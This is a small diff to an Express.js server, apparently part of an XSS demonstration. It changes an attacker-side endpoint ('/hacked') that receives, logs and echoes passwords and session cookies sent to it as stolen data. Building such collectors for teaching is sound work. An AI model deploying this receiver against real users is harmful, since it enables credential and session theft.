@@ -9,9 +9,18 @@ app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
 
-app.get('/hacker.php', (req, res) => {
-  console.log(Date.now() + 'XSS Attack successful', req.query)
-  return res.status(200).send({ message: `${Date.now()} Data Exfiltrated: ${ JSON.stringify(req.query) }` });
+app.get('/hacked', (req, res) => {
+  const { password, session } = req.query;
+
+  const decodedSession = decodeURIComponent(session);
+
+  console.log(Date.now() + 'XSS Attack successful', password, decodedSession)
+
+  res.json({
+    message: `${Date.now()} Exfiltrated data received`,
+    password,
+    session: decodedSession,
+  });
 });
 
 app.listen(port, () => {
